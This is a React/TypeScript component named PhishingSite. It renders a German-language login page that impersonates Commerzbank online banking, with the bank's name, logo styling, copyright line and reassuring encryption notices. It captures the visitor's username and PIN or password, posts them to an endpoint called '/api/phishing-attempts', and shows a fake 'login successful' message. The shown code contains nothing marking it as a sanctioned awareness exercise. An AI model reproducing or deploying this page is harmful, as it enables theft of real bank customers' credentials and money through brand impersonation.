import { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent } from "@/components/ui/card";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";

export default function PhishingSite() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const { toast } = useToast();

  const submitMutation = useMutation({
    mutationFn: async (data: { username: string; password: string }) => {
      const response = await apiRequest("POST", "/api/phishing-attempts", data);
      return response.json();
    },
    onSuccess: () => {
      setShowSuccess(true);
      setTimeout(() => {
        setShowSuccess(false);
        setUsername("");
        setPassword("");
      }, 3000);
    },
    onError: () => {
      toast({
        title: "Fehler",
        description: "Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.",
        variant: "destructive",
      });
    },
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) return;
    
    submitMutation.mutate({ username, password });
  };

  if (showSuccess) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <Card className="w-full max-w-md">
          <CardContent className="p-8 text-center">
            <div className="text-green-600 text-6xl mb-4">✓</div>
            <h2 className="text-xl font-bold text-gray-900 mb-2">Anmeldung erfolgreich</h2>
            <p className="text-gray-600">Sie werden automatisch weitergeleitet...</p>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <div className="bg-white border-b border-gray-200">
        <div className="max-w-4xl mx-auto px-4 py-3">
          <div className="flex items-center space-x-4">
            <div className="w-8 h-8 bg-yellow-400 rounded-sm flex items-center justify-center">
              <span className="text-black font-bold text-sm">C</span>
            </div>
            <span className="text-xl font-light text-gray-800">Commerzbank</span>
            <div className="flex-1"></div>
            <div className="text-sm text-gray-600">Sicher | Privat | Vertrauenswürdig</div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex items-center justify-center min-h-[calc(100vh-80px)] p-4">
        <div className="w-full max-w-md">
          {/* Security Notice */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
            <div className="flex items-start space-x-3">
              <div className="text-blue-600 text-lg">🔒</div>
              <div>
                <h3 className="font-medium text-blue-900">Sicherheitshinweis</h3>
                <p className="text-sm text-blue-800 mt-1">
                  Ihre Verbindung ist verschlüsselt und sicher. Geben Sie Ihre Zugangsdaten ein, um fortzufahren.
                </p>
              </div>
            </div>
          </div>

          {/* Login Card */}
          <Card className="border-0 shadow-lg">
            <CardContent className="p-8">
              <div className="text-center mb-6">
                <h1 className="text-2xl font-light text-gray-900 mb-2">Online-Banking</h1>
                <p className="text-gray-600 text-sm">Melden Sie sich mit Ihren Zugangsdaten an</p>
              </div>

              <form onSubmit={handleSubmit} className="space-y-5">
                <div>
                  <Label htmlFor="username" className="block text-sm font-medium text-gray-700 mb-2">
                    Benutzername / Kontonummer
                  </Label>
                  <Input
                    id="username"
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-500 focus:border-transparent"
                    placeholder="Benutzername eingeben"
                    required
                  />
                </div>

                <div>
                  <Label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                    PIN / Passwort
                  </Label>
                  <Input
                    id="password"
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-500 focus:border-transparent"
                    placeholder="PIN eingeben"
                    required
                  />
                </div>

                <Button
                  type="submit"
                  disabled={submitMutation.isPending || !username || !password}
                  className="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-medium py-2 px-4 rounded-md transition-colors"
                >
                  {submitMutation.isPending ? "Wird überprüft..." : "Anmelden"}
                </Button>
              </form>

              <div className="mt-6 text-center space-y-3">
                <div className="flex items-center justify-center space-x-4 text-sm text-gray-500">
                  <span>Passwort vergessen?</span>
                  <span>•</span>
                  <span>Hilfe</span>
                </div>
                
                <div className="flex items-center justify-center space-x-2 text-xs text-gray-400">
                  <span>🔒</span>
                  <span>SSL-verschlüsselt</span>
                  <span>•</span>
                  <span>TLS 1.3</span>
                  <span>•</span>
                  <span>256-bit Verschlüsselung</span>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Footer Info */}
          <div className="mt-8 text-center text-xs text-gray-500">
            <p>© 2024 Commerzbank AG. Alle Rechte vorbehalten.</p>
            <p className="mt-1">Für Ihre Sicherheit: Geben Sie Ihre Daten niemals an Dritte weiter.</p>
          </div>
        </div>
      </div>
    </div>
  );
}